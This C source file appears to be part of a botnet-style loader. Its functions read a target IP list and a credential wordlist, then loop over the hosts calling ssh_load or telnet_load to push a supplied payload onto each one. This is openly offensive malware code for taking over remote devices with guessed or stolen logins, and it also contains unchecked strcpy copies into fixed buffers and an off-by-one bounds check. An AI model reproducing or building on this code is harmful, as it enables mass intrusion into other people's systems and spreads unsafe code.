#include "../../includes/parser/read.h"


/*
    *    util/loader/util/parser/read.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void load_credentials(char *filename, struct l_list *l_struct[f_len]) {
    size_t n = 0;
    char *line;
    char ipaddr[64];
    char username[64];
    char file_data[5000];

    FILE * list = fopen(filename, "r");
    if (list == NULL) {
        fprintf(stderr, "\nError: Could not open file '%s'!", filename);
        exit(EXIT_FAILURE);
    }
    while (fgets(file_data, sizeof(file_data), list) != NULL) {
        string_handler(username, file_data);
        line = strtok(file_data, " ");
        strcpy(l_struct[n]->username, username);
        strcpy(l_struct[n]->password, line);
        memset(username, 0, strlen(username));
        if (n == f_len) {
            break;
        }
        n++;
    }
    fclose(list);
}

void i_file(char *filename, struct l_list *l_struct[f_len]) {
    size_t n = 0;
    char file_data[5000];
    FILE * list = fopen(filename, "r");
    if (list == NULL) {
        fprintf(stderr, "\nError: Could not open file '%s'!", filename);
        exit(EXIT_FAILURE);
    }
    while (fgets(file_data, sizeof(file_data), list) != NULL) {
        strcpy(l_struct[n]->ipaddr, file_data);
        n++;
    }
    fclose(list);
}

void r_file(char *filename) {
    char file_data[5000];
    FILE * list = fopen(filename, "r");
    if (list == NULL) {
        fprintf(stderr, "\nError: Could not open file '%s'!", filename);
        exit(EXIT_FAILURE);
    }
    while (fgets(file_data, sizeof(file_data), list) != NULL) {
        f_len++;
    }
    fclose(list);
}

void p_start(char *flag, char *i_list, char *wordlist, char *payload) {
    r_file(i_list);
    struct l_list *l_struct[f_len];

    for (int i = 0; i < f_len; i++) {
        l_struct[i] = (struct l_list *)malloc(sizeof(struct l_list));
    }

    i_file(i_list, l_struct);
    load_credentials(wordlist, l_struct);

    if (strncmp(flag, "--ssh", strlen("--ssh")) == 0) {
        for (int i = 0; i < f_len; i++) {
            ssh_load(l_struct[i]->ipaddr, l_struct[i]->password, payload);
        }
    }

    if (strncmp(flag, "--telnet", strlen("--telnet")) == 0) {
        for (int i = 0; i < f_len; i++) {
            telnet_load(l_struct[i]->ipaddr, l_struct[i]->username, l_struct[i]->password, payload);
        }
    }
}